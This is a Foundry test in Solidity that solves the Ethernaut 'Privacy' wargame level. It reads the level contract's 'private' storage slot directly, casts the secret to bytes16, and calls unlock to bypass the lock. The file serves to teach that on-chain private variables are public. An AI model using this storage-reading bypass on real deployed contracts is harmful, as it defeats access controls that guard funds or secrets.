// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

//import "ds-test/test.sol";
import "forge-std/Vm.sol";
import "forge-std/Test.sol";

import "../src/12-Privacy/PrivacyFactory.sol";
import "../src/Ethernaut.sol";

contract PrivacyTest is Test {
    Ethernaut ethernaut;
    address eoaAddress = address(1337);

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(eoaAddress, 10 ether);
    }

    function testPrivacyHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        PrivacyFactory factory = new PrivacyFactory();
        ethernaut.registerLevel(factory);
        vm.startPrank(eoaAddress);
        address levelAddress = ethernaut.createLevelInstance{value: 1 ether}(factory);
        Privacy level = Privacy(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        // Cheat code to load contract storage at specific slot
        bytes32 secretData = vm.load(levelAddress, bytes32(uint256(5)));
        // Log bytes stored at that memory location
        emit log_bytes(abi.encodePacked(secretData)); 

        // Not relevant to completing the level but shows how we can split a bytes32 into its component parts
        bytes16[2] memory secretDataSplit = [bytes16(0), 0];
        assembly {
            mstore(secretDataSplit, secretData)
            mstore(add(secretDataSplit, 16), secretData)
        }

        // Call the unlock function with the secretData we read from storage, also cast bytes32 to bytes16
        level.unlock(bytes16(secretData));

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}